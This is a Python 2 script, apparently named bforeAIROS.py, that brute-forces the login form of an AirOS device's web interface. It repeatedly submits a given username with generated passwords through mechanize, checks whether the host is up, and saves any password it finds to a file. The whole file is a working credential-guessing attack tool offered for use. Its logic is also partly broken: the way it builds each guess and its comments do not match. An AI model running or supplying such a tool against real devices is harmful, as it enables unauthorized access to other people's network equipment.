#!/usr/bin/env python
import string 
import sys,os,time
import mechanize,sys,urllib,socket
from bs4 import BeautifulSoup


ALLOWED_CHARACTERS = string.printable 
NUMBER_OF_CHARACTERS = len(ALLOWED_CHARACTERS) 

def characterToIndex(char):
    return ALLOWED_CHARACTERS.index(char) 

def indexToCharacter(index):
    if NUMBER_OF_CHARACTERS <= index:
        raise ValueError("Index out of range.")
    else:
        return ALLOWED_CHARACTERS[index] 
def next(string):
    """ Get next sequence of characters.
	    Treats characters as numbers (0-255). 
	    Function tries to increment
	    character at the first position. If it fails, new character is
	    added to the back of the list.
	    It's basically a number with base = 256.
	    :param string: A list of characters (can be empty). 
	    :type string: list return: Next list of characters in 
	    :the sequence rettype: list
    """
    if len(string) <= 0:
        string.append(indexToCharacter(0))
    else:
        string[0] = indexToCharacter((characterToIndex(string[0]) + 1) % NUMBER_OF_CHARACTERS)
        if characterToIndex(string[0]) is 0:
            return list(string[0]) + next(string[1:])
    return string 

#this function check the state of the server in case it is down!!
def is_alive(remoteHost):
    try:        
        sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        result = sock.connect_ex(remoteHost)
        if result == 0:           
            return True
        else:
            i=0
            for i in range(3):  #check the server 3 times, in 3 secons, if not responding wait a minute and then check agen
                result = sock.connect_ex(remoteHost)
                time.sleep(1)
            if result == 0:                
                return True
            else:
                print "[-] Server is down waiting for response!!"
                time.sleep(15)
                #is_alive(remoteHost) #callback to se if the server waik Up!!        
        sock.close()
    except socket.error :
        print "Culd not conect to host!"
        sys.exit()

def attack(remoteHost,sequence,username,mc):   
    try:
        text = "" 
        if is_alive(remoteHost):             
            for item in sequence:
                text += item                
                mc.select_form(nr=0)
                mc.form['username'] = username
                mc.form['password'] = text
                if is_alive(remoteHost):
                    mc.submit()
                html = mc.response().read()
                if html.find('Invalid credentials')>0:
                    print "[Error] Usarname: (" + username + ") password: (" + text + ")" 
                    pass
                else:
                    print "[YES] " + text
                    print "Password find!!"            
                    f = open("airos_password.txt","w")
                    f.write(text)
                    f.close()
                    sys.exit(0)	            
    except:
        mc.open('https://197.168.1.1/login.cgi?uri=/index.cgi')
        print "[-] System halt (2) restarting!!"
        pass
sequence = list()
in_url = sys.argv[1] # Servidor (url)
remoteHost = (in_url.split('/')[2],80)

print remoteHost
if is_alive(remoteHost):
    mc = mechanize.Browser()
    mc.open(in_url)
    username = raw_input("Enter user name:")
else:
    print "[-] Server is down noting to do!!"
    sys.exit()

    
if len(sys.argv)==2:
    print "Scaning!!"
else:
    print "Sintax error ./bforeAIROS.py url"
    sys.exit(0)


while True:
    try:           
        sequence = next(sequence)   
        attack(remoteHost,sequence,username,mc)
    except:
        print "[-] systen halt!!"
        attack(remoteHost,sequence,username,mc)
        pass
